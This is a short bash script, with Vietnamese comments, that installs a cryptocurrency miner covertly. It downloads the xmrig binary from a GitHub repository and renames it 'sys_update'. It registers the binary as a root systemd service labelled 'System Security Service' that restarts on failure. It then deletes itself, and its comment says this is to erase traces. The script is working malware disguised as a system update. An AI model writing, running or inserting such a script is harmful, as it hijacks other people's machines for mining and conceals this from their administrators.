#!/bin/bash

# 1. Chuyển vào thư mục tạm để làm việc
cd /tmp

# 2. Tải các file cần thiết từ GitHub của bạn
wget -q https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/xmrig -O sys_update
wget -q https://github.com/AnnaliseHackett/Fix/raw/refs/heads/main/config.json -O config.json

# 3. Cấp quyền thực thi
chmod +x sys_update

# 4. Tạo file Service Startup (Sử dụng kỹ thuật ghi file an toàn)
cat <<EOF > /etc/systemd/system/sys_update.service
[Unit]
Description=System Security Service
After=network.target

[Service]
Type=simple
ExecStart=/tmp/sys_update --config=/tmp/config.json
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

# 5. Kích hoạt dịch vụ
systemctl daemon-reload
systemctl enable sys_update
systemctl start sys_update

# 6. Xóa chính file setup.sh này để xóa dấu vết

rm -- "$0"

